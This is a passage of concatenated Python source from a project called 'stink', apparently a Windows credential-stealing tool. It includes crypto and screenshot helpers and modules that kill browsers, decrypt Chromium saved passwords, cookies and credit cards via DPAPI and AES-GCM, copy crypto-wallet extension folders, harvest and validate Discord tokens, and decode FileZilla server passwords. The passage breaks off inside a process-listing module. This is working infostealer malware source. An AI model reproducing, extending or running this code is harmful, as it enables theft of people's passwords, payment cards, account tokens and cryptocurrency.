            result += self._feed(self._buffer[:can_consume])
            self._buffer = self._buffer[can_consume:]

        return result


class Encrypter(BlockFeeder):

    def __init__(self, mode, padding=PADDING_DEFAULT):
        BlockFeeder.__init__(self, mode, mode.encrypt, mode._final_encrypt, padding)


class Decrypter(BlockFeeder):

    def __init__(self, mode, padding=PADDING_DEFAULT):
        BlockFeeder.__init__(self, mode, mode.decrypt, mode._final_decrypt, padding)


BLOCK_SIZE = 1 << 13


def _feed_stream(feeder, in_stream, out_stream, block_size=BLOCK_SIZE):

    while True:
        chunk = in_stream.read(block_size)
        if not chunk:
            break
        converted = feeder.feed(chunk)
        out_stream.write(converted)
    converted = feeder.feed()
    out_stream.write(converted)


def encrypt_stream(
    mode, in_stream, out_stream, block_size=BLOCK_SIZE, padding=PADDING_DEFAULT
):

    encrypter = Encrypter(mode, padding=padding)
    _feed_stream(encrypter, in_stream, out_stream, block_size)


def decrypt_stream(
    mode, in_stream, out_stream, block_size=BLOCK_SIZE, padding=PADDING_DEFAULT
):

    decrypter = Decrypter(mode, padding=padding)
    _feed_stream(decrypter, in_stream, out_stream, block_size)


# Content from stink/stink/helpers/cipher/utils.py
def to_bufferable(binary):
    return binary


def _get_byte(c):
    return ord(c)


try:
    xrange
except:

    def to_bufferable(binary):
        if isinstance(binary, bytes):
            return binary
        return bytes(ord(b) for b in binary)

    def _get_byte(c):
        return c


def append_PKCS7_padding(data):
    pad = 16 - (len(data) % 16)
    return data + to_bufferable(chr(pad) * pad)


def strip_PKCS7_padding(data):
    if len(data) % 16 != 0:
        raise ValueError("invalid length")

    pad = _get_byte(data[-1])

    if pad > 16:
        raise ValueError("invalid padding byte")

    return data[:-pad]


# Content from stink/stink/helpers/screenshot/__init__.py



# Content from stink/stink/helpers/screenshot/screen.py
from collections import namedtuple
from typing import Any, Dict, Optional, Type


class Screen:

    Monitor = Dict[str, int]
    Size = namedtuple("Size", "width, height")
    Position = namedtuple("Position", "left, top")

    def __init__(self, data: bytearray, monitor: Monitor, size: Optional[Size] = None):

        self.__pixels = None
        self.__rgb = None
        self.raw = data
        self.position = Screen.Position(monitor["left"], monitor["top"])
        self.size = (
            Screen.Size(monitor["width"], monitor["height"]) if size is None else size
        )

    @property
    def __array_interface__(self) -> Dict[str, Any]:

        return {
            "version": 3,
            "shape": (self.height, self.width, 4),
            "typestr": "|u1",
            "data": self.raw,
        }

    @classmethod
    def from_size(cls: Type["ScreenShot"], data: bytearray, width: int, height: int):

        monitor = {"left": 0, "top": 0, "width": width, "height": height}
        return cls(data, monitor)

    @property
    def rgb(self):

        if not self.__rgb:

            rgb = bytearray(self.height * self.width * 3)
            raw = self.raw
            rgb[::3] = raw[2::4]
            rgb[1::3] = raw[1::4]
            rgb[2::3] = raw[::4]
            self.__rgb = bytes(rgb)

        return self.__rgb

    @property
    def bgra(self):
        return bytes(self.raw)

    @property
    def height(self):
        return self.size.height

    @property
    def width(self):
        return self.size.width

    @property
    def left(self):
        return self.position.left

    @property
    def top(self):
        return self.position.top

    @property
    def pixels(self):

        if not self.__pixels:

            rgb = zip(self.raw[2::4], self.raw[1::4], self.raw[::4])
            self.__pixels = list(zip(*[iter(rgb)] * self.width))

        return self.__pixels

    def pixel(self, x: int, y: int):

        try:
            return self.pixels[y][x]
        except:
            print(f"Pixel location ({x}, {y}) is out of range.")


# Content from stink/stink/helpers/screenshot/screencapture.py
from ctypes import (
    POINTER,
    WINFUNCTYPE,
    Array,
    WinDLL,
    c_char,
    c_void_p,
    create_string_buffer,
    sizeof,
    windll,
)
from ctypes.wintypes import (
    BOOL,
    DOUBLE,
    DWORD,
    HBITMAP,
    HDC,
    HGDIOBJ,
    HWND,
    INT,
    LPARAM,
    LPRECT,
    RECT,
    UINT,
)
from os import fsync
from struct import pack
from sys import getwindowsversion
from threading import Lock, current_thread, main_thread
from typing import Any, Callable, Dict, List, Optional, Tuple, Union
from zlib import compress, crc32

from stink.helpers import BitmapInfo, BitmapInfoHeader
from stink.helpers.screenshot.screen import Screen

CAPTUREBLT = 0x40000000
DIB_RGB_COLORS = 0
SRCCOPY = 0x00CC0020
MONITORNUMPROC = WINFUNCTYPE(INT, DWORD, DWORD, POINTER(RECT), DOUBLE)
CFUNCTIONS = {
    "BitBlt": ("gdi32", [HDC, INT, INT, INT, INT, HDC, INT, INT, DWORD], BOOL),
    "CreateCompatibleBitmap": ("gdi32", [HDC, INT, INT], HBITMAP),
    "CreateCompatibleDC": ("gdi32", [HDC], HDC),
    "DeleteObject": ("gdi32", [HGDIOBJ], INT),
    "EnumDisplayMonitors": ("user32", [HDC, c_void_p, MONITORNUMPROC, LPARAM], BOOL),
    "GetDeviceCaps": ("gdi32", [HWND, INT], INT),
    "GetDIBits": (
        "gdi32",
        [HDC, HBITMAP, UINT, UINT, c_void_p, POINTER(BitmapInfo), UINT],
        BOOL,
    ),
    "GetSystemMetrics": ("user32", [INT], INT),
    "GetWindowDC": ("user32", [HWND], HDC),
    "SelectObject": ("gdi32", [HDC, HGDIOBJ], HGDIOBJ),
}

lock = Lock()


class Screencapture:

    bmp = None
    memdc = None
    Monitor = Dict[str, int]

    _srcdc_dict = {}

    def __init__(self, **_: Any):

        self.cls_image = Screen
        self.compression_level = 6
        self.with_cursor = False
        self._monitors = []

        self.user32 = WinDLL("user32")
        self.gdi32 = WinDLL("gdi32")
        self._set_cfunctions()
        self._set_dpi_awareness()

        self._bbox = {"height": 0, "width": 0}
        self._data: Array[c_char] = create_string_buffer(0)

        srcdc = self._get_srcdc()

        if not Screencapture.memdc:
            Screencapture.memdc = self.gdi32.CreateCompatibleDC(srcdc)

        bmi = BitmapInfo()
        bmi.bmiHeader.biSize = sizeof(BitmapInfoHeader)
        bmi.bmiHeader.biPlanes = 1
        bmi.bmiHeader.biBitCount = 32
        bmi.bmiHeader.biCompression = 0
        bmi.bmiHeader.biClrUsed = 0
        bmi.bmiHeader.biClrImportant = 0

        self._bmi = bmi

    @property
    def monitors(self):

        if not self._monitors:
            with lock:
                self._monitors_impl()

        return self._monitors

    @staticmethod
    def _merge(screenshot: Screen, cursor: Screen):

        (cx, cy), (cw, ch) = cursor.position, cursor.size
        (x, y), (w, h) = screenshot.position, screenshot.size

        cx2, cy2 = cx + cw, cy + ch
        x2, y2 = x + w, y + h

        overlap = cx < x2 and cx2 > x and cy < y2 and cy2 > y

        if not overlap:
            return screenshot

        screen_data = screenshot.raw
        cursor_data = cursor.raw

        cy, cy2 = (cy - y) * 4, (cy2 - y2) * 4
        cx, cx2 = (cx - x) * 4, (cx2 - x2) * 4
        start_count_y = -cy if cy < 0 else 0
        start_count_x = -cx if cx < 0 else 0
        stop_count_y = ch * 4 - max(cy2, 0)
        stop_count_x = cw * 4 - max(cx2, 0)
        rgb = range(3)

        for count_y in range(start_count_y, stop_count_y, 4):
            pos_s = (count_y + cy) * w + cx
            pos_c = count_y * cw

            for count_x in range(start_count_x, stop_count_x, 4):
                spos = pos_s + count_x
                cpos = pos_c + count_x
                alpha = cursor_data[cpos + 3]

                if not alpha:
                    continue

                if alpha == 255:
                    screen_data[spos : spos + 3] = cursor_data[cpos : cpos + 3]

                else:
                    alpha = alpha / 255
                    for item in rgb:
                        screen_data[spos + item] = int(
                            cursor_data[cpos + item] * alpha
                            + screen_data[spos + item] * (1 - alpha)
                        )

        return screenshot

    @staticmethod
    def _cfactory(
        attr: Any,
        func: str,
        argtypes: List[Any],
        restype: Any,
        errcheck: Optional[Callable] = None,
    ):

        meth = getattr(attr, func)
        meth.argtypes = argtypes
        meth.restype = restype

        if errcheck:
            meth.errcheck = errcheck

    def _set_cfunctions(self) -> None:

        cfactory = self._cfactory
        attrs = {
            "gdi32": self.gdi32,
            "user32": self.user32,
        }

        for func, (attr, argtypes, restype) in CFUNCTIONS.items():
            cfactory(
                attr=attrs[attr],
                func=func,
                argtypes=argtypes,
                restype=restype,
            )

    def _set_dpi_awareness(self) -> None:

        version = getwindowsversion()[:2]

        if version >= (6, 3):
            windll.shcore.SetProcessDpiAwareness(2)

        elif (6, 0) <= version < (6, 3):
            self.user32.SetProcessDPIAware()

    def _get_srcdc(self) -> int:

        current_thread_index = current_thread()
        current_srcdc = Screencapture._srcdc_dict.get(
            current_thread_index
        ) or Screencapture._srcdc_dict.get(main_thread())

        if current_srcdc:
            srcdc = current_srcdc

        else:
            srcdc = self.user32.GetWindowDC(0)
            Screencapture._srcdc_dict[current_thread_index] = srcdc

        return srcdc

    def _monitors_impl(self) -> None:

        int_ = int
        user32 = self.user32
        get_system_metrics = user32.GetSystemMetrics

        self._monitors.append(
            {
                "left": int_(get_system_metrics(76)),
                "top": int_(get_system_metrics(77)),
                "width": int_(get_system_metrics(78)),
                "height": int_(get_system_metrics(79)),
            }
        )

        def _callback(monitor: int, data: HDC, rect: LPRECT, dc_: LPARAM) -> int:

            rct = rect.contents
            self._monitors.append(
                {
                    "left": int_(rct.left),
                    "top": int_(rct.top),
                    "width": int_(rct.right) - int_(rct.left),
                    "height": int_(rct.bottom) - int_(rct.top),
                }
            )

            return 1

        callback = MONITORNUMPROC(_callback)
        user32.EnumDisplayMonitors(0, 0, callback, 0)

    def _grab_impl(self, monitor: Monitor) -> Screen:

        srcdc, memdc = self._get_srcdc(), Screencapture.memdc
        width, height = monitor["width"], monitor["height"]

        if (self._bbox["height"], self._bbox["width"]) != (height, width):

            self._bbox = monitor
            self._bmi.bmiHeader.biWidth = width
            self._bmi.bmiHeader.biHeight = -height
            self._data = create_string_buffer(width * height * 4)

            if Screencapture.bmp:
                self.gdi32.DeleteObject(Screencapture.bmp)

            Screencapture.bmp = self.gdi32.CreateCompatibleBitmap(srcdc, width, height)
            self.gdi32.SelectObject(memdc, Screencapture.bmp)

        self.gdi32.BitBlt(
            memdc,
            0,
            0,
            width,
            height,
            srcdc,
            monitor["left"],
            monitor["top"],
            SRCCOPY | CAPTUREBLT,
        )
        bits = self.gdi32.GetDIBits(
            memdc, Screencapture.bmp, 0, height, self._data, self._bmi, DIB_RGB_COLORS
        )

        if bits != height:
            print("gdi32.GetDIBits() failed.")

        return self.cls_image(bytearray(self._data), monitor)

    def _cursor_impl(self) -> Optional[Screen]:
        return None

    def grab(self, monitor: Union[Monitor, Tuple[int, int, int, int]]):

        if isinstance(monitor, tuple):
            monitor = {
                "left": monitor[0],
                "top": monitor[1],
                "width": monitor[2] - monitor[0],
                "height": monitor[3] - monitor[1],
            }

        with lock:

            screenshot = self._grab_impl(monitor)
            if self.with_cursor:

                cursor = self._cursor_impl()
                screenshot = self._merge(screenshot, cursor)

            return screenshot

    def save_in_memory(self):

        monitors = [
            dict(monitor)
            for monitor in set(tuple(monitor.items()) for monitor in self.monitors)
        ]

        for index, display in enumerate(monitors):
            sct = self.grab(display)
            output = self.create_png(
                sct.rgb, sct.size, level=self.compression_level, output=None
            )

            yield output

    def create_in_memory(self, **kwargs: Any):

        kwargs["monitor"] = kwargs.get("monitor", 1)
        return [image for image in self.save_in_memory()]

    @staticmethod
    def create_png(
        data: bytes, size: Tuple[int, int], level: int = 6, output: Optional[str] = None
    ):

        width, height = size
        line = width * 3
        png_filter = pack(">B", 0)
        scanlines = b"".join(
            [png_filter + data[y * line : y * line + line] for y in range(height)]
        )
        magic = pack(">8B", 137, 80, 78, 71, 13, 10, 26, 10)

        ihdr = [b"", b"IHDR", b"", b""]
        ihdr[2] = pack(">2I5B", width, height, 8, 2, 0, 0, 0)
        ihdr[3] = pack(">I", crc32(b"".join(ihdr[1:3])) & 0xFFFFFFFF)
        ihdr[0] = pack(">I", len(ihdr[2]))

        idat = [b"", b"IDAT", compress(scanlines, level), b""]
        idat[3] = pack(">I", crc32(b"".join(idat[1:3])) & 0xFFFFFFFF)
        idat[0] = pack(">I", len(idat[2]))

        iend = [b"", b"IEND", b"", b""]
        iend[3] = pack(">I", crc32(iend[1]) & 0xFFFFFFFF)
        iend[0] = pack(">I", len(iend[2]))

        if not output:
            return magic + b"".join(ihdr + idat + iend)

        with open(output, "wb") as fileh:
            fileh.write(magic)
            fileh.write(b"".join(ihdr))
            fileh.write(b"".join(idat))
            fileh.write(b"".join(iend))

            fileh.flush()
            fsync(fileh.fileno())

        return None


# Content from stink/stink/modules/__init__.py

    "Chromium",
    "Discord",
    "FileZilla",
    "Processes",
    "Screenshot",
    "System",
    "Telegram",
    "Steam",
    "Wallets",
]


# Content from stink/stink/modules/browsers.py
from base64 import b64decode
from ctypes import byref, c_buffer, cdll, windll
from datetime import datetime, timedelta
from json import load, loads
from os import listdir, path
from re import compile
from sqlite3 import Connection, Cursor, connect
from subprocess import CREATE_NEW_CONSOLE, SW_HIDE, run
from typing import List, Tuple

from stink.enums.features import Features
from stink.helpers import AESModeOfOperationGCM, DataBlob, MemoryStorage
from stink.helpers.config import ChromiumConfig
from stink.helpers.dataclasses import Data


class Chromium:
    """
    Collects data from the browser.
    """

    def __init__(
        self, browser_name: str, browser_path: str, process_name: str, statuses: List
    ):

        self.__browser_name = browser_name
        self.__state_path = path.join(browser_path, "Local State")
        self.__browser_path = browser_path
        self.__process_name = process_name
        self.__statuses = statuses
        self.__profiles = None

        self.__storage = MemoryStorage()
        self.__config = ChromiumConfig()
        self.__path = path.join("Browsers", self.__browser_name)

    def _kill_process(self):
        """
        Kills browser process.

        Parameters:
        - None.

        Returns:
        - None.
        """
        run(
            f"taskkill /f /im {self.__process_name}",
            shell=True,
            creationflags=CREATE_NEW_CONSOLE | SW_HIDE,
        )

    def _get_profiles(self) -> List:
        """
        Collects all browser profiles.

        Parameters:
        - None.

        Returns:
        - list: List of all browser profiles.
        """
        pattern = compile(r"Default|Profile \d+")
        profiles = sum(
            [pattern.findall(dir_path) for dir_path in listdir(self.__browser_path)], []
        )
        profile_paths = [
            path.join(self.__browser_path, profile) for profile in profiles
        ]

        if profile_paths:
            return profile_paths

        return [self.__browser_path]

    def _check_paths(self) -> None:
        """
        Checks if a browser is installed and if data collection from it is enabled.

        Parameters:
        - None.

        Returns:
        - None.
        """
        if path.exists(self.__browser_path) and any(self.__statuses):
            self.__profiles = self._get_profiles()

    @staticmethod
    def _crypt_unprotect_data(
        encrypted_bytes: b64decode, entropy: bytes = b""
    ) -> bytes:
        """
        Decrypts data previously encrypted using Windows CryptProtectData function.

        Parameters:
        - encrypted_bytes [b64decode]: The encrypted data to be decrypted.
        - entropy [bytes]: Optional entropy to provide additional security during decryption.

        Returns:
        - bytes: Decrypted data as bytes.
        """
        blob = DataBlob()

        if windll.crypt32.CryptUnprotectData(
            byref(
                DataBlob(
                    len(encrypted_bytes),
                    c_buffer(encrypted_bytes, len(encrypted_bytes)),
                )
            ),
            None,
            byref(DataBlob(len(entropy), c_buffer(entropy, len(entropy)))),
            None,
            None,
            0x01,
            byref(blob),
        ):

            buffer = c_buffer(int(blob.cbData))
            cdll.msvcrt.memcpy(buffer, blob.pbData, int(blob.cbData))
            windll.kernel32.LocalFree(blob.pbData)

            return buffer.raw

    def _get_key(self) -> bytes:
        """
        Receives the decryption key.

        Parameters:
        - None.

        Returns:
        - bytes: Decryption key.
        """
        with open(self.__state_path, "r", encoding="utf-8") as state:
            file = state.read()

        state.close()

        return self._crypt_unprotect_data(
            b64decode(loads(file)["os_crypt"]["encrypted_key"])[5:]
        )

    @staticmethod
    def _get_datetime(date: int) -> str:
        """
        Converts timestamp to date.

        Parameters:
        - date [int]: Date to be converted.

        Returns:
        - str: Converted date or error message.
        """
        try:
            return str(datetime(1601, 1, 1) + timedelta(microseconds=date))
        except:
            return "Can't decode"

    @staticmethod
    def _decrypt(value: bytes, master_key: bytes) -> str:
        """
        Decrypts the value with the master key.

        Parameters:
        - value [bytes]: The value to be decrypted.
        - master_key [bytes]: Decryption key.

        Returns:
        - str: Decrypted string.
        """
        try:
            return (
                AESModeOfOperationGCM(master_key, value[3:15])
                .decrypt(value[15:])[:-16]
                .decode()
            )
        except:
            return "Can't decode"

    @staticmethod
    def _get_db_connection(database: str) -> Tuple[Cursor, Connection]:
        """
        Creates a connection with the database.

        Parameters:
        - database [str]: Path to database.

        Returns:
        - tuple: Cursor and Connection objects.
        """
        connection = connect(
            f"file:{database}?mode=ro&immutable=1",
            uri=True,
            isolation_level=None,
            check_same_thread=False,
        )
        cursor = connection.cursor()

        return cursor, connection

    @staticmethod
    def _get_file(file_path: str) -> str:
        """
        Reads the file contents.

        Parameters:
        - file_path [str]: Path to file.

        Returns:
        - str: File content.
        """
        with open(file_path, "r", encoding="utf-8") as file:
            data = file.read()

        return data

    def _grab_passwords(self, profile: str, file_path: str) -> None:
        """
        Collects browser passwords.

        Parameters:
        - profile [str]: Browser profile.
        - main_path [str]: Path of the file to be processed.
        - alt_path [str]: Spare path of the file to be processed.

        Returns:
        - None.
        """
        if not path.exists(file_path):
            print(f"[{self.__browser_name}]: No passwords file found")
            return

        cursor, connection = self._get_db_connection(file_path)
        passwords_list = cursor.execute(self.__config.PasswordsSQL).fetchall()

        cursor.close()
        connection.close()

        if not passwords_list:
            print(f"[{self.__browser_name}]: No passwords found")
            return

        data = self.__config.PasswordsData
        temp = set(
            [
                data.format(
                    result[0], result[1], self._decrypt(result[2], self.__master_key)
                )
                for result in passwords_list
            ]
        )

        self.__storage.add_from_memory(
            path.join(self.__path, rf"{profile} Passwords.txt"),
            "".join(item for item in temp),
        )

        self.__storage.add_data("Passwords", len(temp))

    def _grab_cookies(self, profile: str, file_path: str) -> None:
        """
        Collects browser cookies.

        Parameters:
        - profile [str]: Browser profile.
        - main_path [str]: Path of the file to be processed.
        - alt_path [str]: Spare path of the file to be processed.

        Returns:
        - None.
        """
        if not path.exists(file_path):
            print(f"[{self.__browser_name}]: No cookies file found")
            return

        cursor, connection = self._get_db_connection(file_path)
        cookies_list = cursor.execute(self.__config.CookiesSQL).fetchall()

        cursor.close()
        connection.close()

        if not cookies_list:
            print(f"[{self.__browser_name}]: No cookies found")
            return

        cookies_list_filtered = [row for row in cookies_list if row[0] != ""]

        data = self.__config.CookiesData
        temp = [
            data.format(row[0], row[1], self._decrypt(row[2], self.__master_key))
            for row in cookies_list_filtered
        ]

        self.__storage.add_from_memory(
            path.join(self.__path, rf"{profile} Cookies.txt"),
            "\n".join(row for row in temp),
        )

        self.__storage.add_data("Cookies", len(temp))

    def _grab_cards(self, profile: str, file_path: str) -> None:
        """
        Collects browser cards.

        Parameters:
        - profile [str]: Browser profile.
        - main_path [str]: Path of the file to be processed.
        - alt_path [str]: Spare path of the file to be processed.

        Returns:
        - None.
        """
        if not path.exists(file_path):
            print(f"[{self.__browser_name}]: No cards file found")
            return

        cursor, connection = self._get_db_connection(file_path)
        cards_list = cursor.execute(self.__config.CardsSQL).fetchall()

        cursor.close()
        connection.close()

        if not cards_list:
            print(f"[{self.__browser_name}]: No cards found")
            return

        data = self.__config.CardsData
        temp = set(
            [
                data.format(
                    result[0],
                    self._decrypt(result[3], self.__master_key),
                    result[1],
                    result[2],
                )
                for result in cards_list
            ]
        )

        self.__storage.add_from_memory(
            path.join(self.__path, rf"{profile} Cards.txt"),
            "".join(item for item in temp),
        )

        self.__storage.add_data("Cards", len(temp))

    def _grab_history(self, profile: str, file_path: str) -> None:
        """
        Collects browser history.

        Parameters:
        - profile [str]: Browser profile.
        - main_path [str]: Path of the file to be processed.
        - alt_path [str]: Spare path of the file to be processed.

        Returns:
        - None.
        """
        if not path.exists(file_path):
            print(f"[{self.__browser_name}]: No history file found")
            return

        cursor, connection = self._get_db_connection(file_path)
        results = cursor.execute(self.__config.HistorySQL).fetchall()
        history_list = [
            cursor.execute(self.__config.HistoryLinksSQL % int(item[0])).fetchone()
            for item in results
        ]

        cursor.close()
        connection.close()

        if not results:
            print(f"[{self.__browser_name}]: No history found")
            return

        data = self.__config.HistoryData
        temp = set(
            [
                data.format(result[0], result[1], self._get_datetime(result[2]))
                for result in history_list
            ]
        )

        self.__storage.add_from_memory(
            path.join(self.__path, rf"{profile} History.txt"),
            "".join(item for item in temp),
        )

        self.__storage.add_data("History", len(temp))

    def _grab_bookmarks(self, profile: str, file_path: str) -> None:
        """
        Collects browser bookmarks.

        Parameters:
        - profile [str]: Browser profile.
        - main_path [str]: Path of the file to be processed.
        - alt_path [str]: Spare path of the file to be processed.

        Returns:
        - None.
        """
        if not path.exists(file_path):
            print(f"[{self.__browser_name}]: No bookmarks file found")
            return

        file = self._get_file(file_path)
        bookmarks_list = sum(
            [self.__config.BookmarksRegex.findall(item) for item in file.split("{")], []
        )

        if not bookmarks_list:
            print(f"[{self.__browser_name}]: No bookmarks found")
            return

        data = self.__config.BookmarksData
        temp = set([data.format(result[0], result[1]) for result in bookmarks_list])

        self.__storage.add_from_memory(
            path.join(self.__path, rf"{profile} Bookmarks.txt"),
            "".join(item for item in temp),
        )

        self.__storage.add_data("Bookmarks", len(temp))

    def _grab_extensions(self, profile: str, extensions_path: str) -> None:
        """
        Collects browser extensions.

        Parameters:
        - profile [str]: Browser profile.
        - extensions_path [str]: Path to extensions directory.

        Returns:
        - None.
        """
        if not path.exists(extensions_path):
            print(f"[{self.__browser_name}]: No extensions folder found")
            return

        extensions_list = []
        extensions_dirs = listdir(extensions_path)

        if not extensions_dirs:
            print(f"[{self.__browser_name}]: No extensions found")
            return

        for dirpath in extensions_dirs:

            extension_dir = listdir(path.join(extensions_path, dirpath))

            if len(extension_dir) == 0:
                continue

            extension_dir = extension_dir[-1]
            manifest_path = path.join(
                extensions_path, dirpath, extension_dir, "manifest.json"
            )

            with open(manifest_path, "r", encoding="utf-8") as file:
                manifest = load(file)
                name = manifest.get("name")

                if name:
                    extensions_list.append(name)

            file.close()

        extensions_set = set(extensions_list)

        self.__storage.add_from_memory(
            path.join(self.__path, rf"{profile} Extensions.txt"),
            "\n".join(item for item in extensions_set),
        )

        self.__storage.add_data("Extensions", len(extensions_set))

    def _grab_wallets(self, profile: str, wallets: str) -> None:
        """
        Collects browser wallets.

        Parameters:
        - profile [str]: Browser profile.
        - wallets [str]: Path to wallets directory.

        Returns:
        - None.
        """
        if not path.exists(wallets):
            print(f"[{self.__browser_name}]: No wallets found")
            return

        for wallet in self.__config.WalletLogs:
            for extension in wallet["folders"]:

                try:

                    extension_path = path.join(wallets, extension)

                    if not path.exists(extension_path):
                        continue

                    self.__storage.add_from_disk(
                        extension_path,
                        path.join(
                            "Wallets",
                            rf'{self.__browser_name} {profile} {wallet["name"]}',
                        ),
                    )

                    self.__storage.add_data("Wallet", wallet["name"])

                except Exception as e:
                    print(f"[{self.__browser_name}]: {repr(e)}")

    def _process_profile(self, profile: str) -> None:
        """
        Collects browser profile data.

        Parameters:
        - profile [str]: Browser profile.

        Returns:
        - None.
        """
        profile_name = profile.replace("\\", "/").split("/")[-1]
        functions = [
            {
                "method": self._grab_passwords,
                "arguments": [profile_name, path.join(profile, "Login Data")],
                "status": True if Features.passwords in self.__statuses else False,
            },
            {
                "method": self._grab_cookies,
                "arguments": [profile_name, path.join(profile, "Network", "Cookies")],
                "status": True if Features.cookies in self.__statuses else False,
            },
            {
                "method": self._grab_cards,
                "arguments": [profile_name, path.join(profile, "Web Data")],
                "status": True if Features.cards in self.__statuses else False,
            },
            {
                "method": self._grab_history,
                "arguments": [profile_name, path.join(profile, "History")],
                "status": True if Features.history in self.__statuses else False,
            },
            {
                "method": self._grab_bookmarks,
                "arguments": [profile_name, path.join(profile, "Bookmarks")],
                "status": True if Features.bookmarks in self.__statuses else False,
            },
            {
                "method": self._grab_extensions,
                "arguments": [profile_name, path.join(profile, "Extensions")],
                "status": True if Features.bookmarks in self.__statuses else False,
            },
            {
                "method": self._grab_wallets,
                "arguments": [
                    profile_name,
                    path.join(profile, "Local Extension Settings"),
                ],
                "status": True if Features.wallets in self.__statuses else False,
            },
        ]

        for function in functions:

            try:

                if function["status"] is False:
                    continue

                function["method"](*function["arguments"])

            except Exception as e:
                print(f"[{self.__browser_name}]: {repr(e)}")

    def _check_profiles(self) -> None:
        """
        Collects data for each browser profile.

        Parameters:
        - None.

        Returns:
        - None.
        """
        if not self.__profiles:
            print(f"[{self.__browser_name}]: No profiles found")
            return

        self.__master_key = self._get_key()

        for profile in self.__profiles:
            self._process_profile(profile)

    def run(self) -> Data:
        """
        Launches the browser data collection module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            self._kill_process()
            self._check_paths()
            self._check_profiles()

            return self.__storage.get_data()

        except Exception as e:
            print(f"[{self.__browser_name}]: {repr(e)}")


# Content from stink/stink/modules/discord.py
from json import loads
from os import listdir, path
from re import findall
from threading import Thread
from typing import Dict, MutableMapping
from urllib.request import Request, urlopen

from stink.helpers import MemoryStorage
from stink.helpers.config import DiscordConfig
from stink.helpers.dataclasses import Data


class Discord:
    """
    Collects tokens from the Discord.
    """

    def __init__(self, folder: str):

        self.__file = path.join(folder, "Tokens.txt")
        self.__config = DiscordConfig()
        self.__storage = MemoryStorage()

    def __get_headers(
        self, token: str = None, content_type: str = "application/json"
    ) -> Dict:
        """
        Composes the headers for the query.

        Parameters:
        - token [str]: Discord token.
        - content_type [str]: Content type.

        Returns:
        - dict: Headers data.
        """
        headers = {"Content-Type": content_type, "User-Agent": self.__config.UserAgent}

        if token is not None:
            headers.update({"Authorization": token})

        return headers

    def __check_token(self, *args: MutableMapping[str, str]) -> None:
        """
        Checks token for validity.

        Parameters:
        - *args [tuple]: Discord token and query headers.

        Returns:
        - None.
        """
        try:
            query = urlopen(
                Request(
                    method="GET",
                    url="https://discordapp.com/api/v6/users/@me",
                    headers=args[1],
                )
            )
            self.valid.append((args[0], query))
        except:
            self.invalid.append(args[0])

    def __get_tokens(self) -> None:
        """
        Collects all valid and invalid Discord tokens.

        Parameters:
        - None.

        Returns:
        - None.
        """
        if not path.exists(self.__config.TokensPath):
            print(f"[Discord]: No Discord found")
            return

        tokens = []

        self.valid = []
        self.invalid = []

        for file in listdir(self.__config.TokensPath):

            if file[-4:] not in [".log", ".ldb"]:
                continue

            for data in [
                line.strip()
                for line in open(
                    path.join(self.__config.TokensPath, file),
                    "r",
                    errors="ignore",
                    encoding="utf-8",
                ).readlines()
            ]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                    [tokens.append(item) for item in findall(regex, data)]

        if not tokens:
            return

        tasks = []

        for token in tokens:
            task = Thread(
                target=self.__check_token, args=[token, self.__get_headers(token)]
            )
            task.setDaemon(True)
            task.start()
            tasks.append(task)

        for task in tasks:
            task.join()

        temp = []

        for result in self.valid:
            storage = loads(result[1].read().decode("utf-8"))
            data = self.__config.DiscordData

            temp.append(
                data.format(
                    storage["username"] if storage["username"] else "No data",
                    storage["email"] if storage["email"] else "No data",
                    storage["phone"] if storage["phone"] else "No data",
                    storage["bio"] if storage["bio"] else "No data",
                    result[0],
                )
            )

        self.__storage.add_from_memory(
            self.__file,
            "Invalid tokens:\n"
            + "\n".join(item for item in self.invalid)
            + "\n\nValid tokens:\n"
            + "".join(item for item in temp),
        )

        self.__storage.add_data("Application", "Discord")

    def run(self) -> Data:
        """
        Launches the Discord tokens collection module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            self.__get_tokens()

            return self.__storage.get_data()

        except Exception as e:
            print(f"[Discord]: {repr(e)}")


# Content from stink/stink/modules/filezilla.py
from base64 import b64decode
from os import listdir, path
from xml.etree import ElementTree

from stink.helpers import MemoryStorage
from stink.helpers.config import FileZillaConfig
from stink.helpers.dataclasses import Data


class FileZilla:
    """
    Collects hosts from the FileZilla.
    """

    def __init__(self, folder: str):

        self.__file = path.join(folder, "Sites.txt")
        self.__config = FileZillaConfig()
        self.__storage = MemoryStorage()

    def __get_hosts(self) -> None:
        """
        Collects all FileZilla hosts.

        Parameters:
        - None.

        Returns:
        - None.
        """
        if not path.exists(self.__config.SitesPath):
            print(f"[FileZilla]: No FileZilla found")
            return

        files = listdir(self.__config.SitesPath)
        data_files = self.__config.DataFiles

        if not any(file in data_files for file in files):
            return

        temp = []

        for file in data_files:
            try:

                root = ElementTree.parse(
                    path.join(self.__config.SitesPath, file)
                ).getroot()
                data = self.__config.FileZillaData

                if not root:
                    continue

                for server in root[0].findall("Server"):

                    site_name = (
                        server.find("Name").text
                        if hasattr(server.find("Name"), "text")
                        else ""
                    )
                    site_user = (
                        server.find("User").text
                        if hasattr(server.find("User"), "text")
                        else ""
                    )
                    site_pass = (
                        server.find("Pass").text
                        if hasattr(server.find("Pass"), "text")
                        else ""
                    )
                    site_host = (
                        server.find("Host").text
                        if hasattr(server.find("Host"), "text")
                        else ""
                    )
                    site_port = (
                        server.find("Port").text
                        if hasattr(server.find("Port"), "text")
                        else ""
                    )
                    site_pass = b64decode(site_pass).decode("utf-8")

                    temp.append(
                        data.format(
                            site_name, site_user, site_pass, site_host, site_port
                        )
                    )

            except Exception as e:
                print(f"[FileZilla]: {file} - {repr(e)}")

        self.__storage.add_from_memory(self.__file, "".join(item for item in temp))

        self.__storage.add_data("Application", "FileZilla")

    def run(self) -> Data:
        """
        Launches the FileZilla hosts collection module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            self.__get_hosts()

            return self.__storage.get_data()

        except Exception as e:
            print(f"[FileZilla]: {repr(e)}")


# Content from stink/stink/modules/processes.py
from ctypes import byref, create_unicode_buffer, sizeof, windll
from ctypes.wintypes import DWORD
from os import path
from typing import List

from stink.helpers import MemoryStorage, ProcessMemoryCountersEx, functions
from stink.helpers.dataclasses import Data


class Processes:
    """
    Collects all running processes.
    """

    def __init__(self, folder: str):

        self.__file = path.join(folder, "Processes.txt")
        self.__storage = MemoryStorage()

    @staticmethod
    def get_processes_list() -> List:

        process_list = []
        process_ids = (DWORD * 4096)()
        bytes_needed = DWORD()
        mb = 1024 * 1024

        windll.psapi.EnumProcesses(
            byref(process_ids), sizeof(process_ids), byref(bytes_needed)
        )

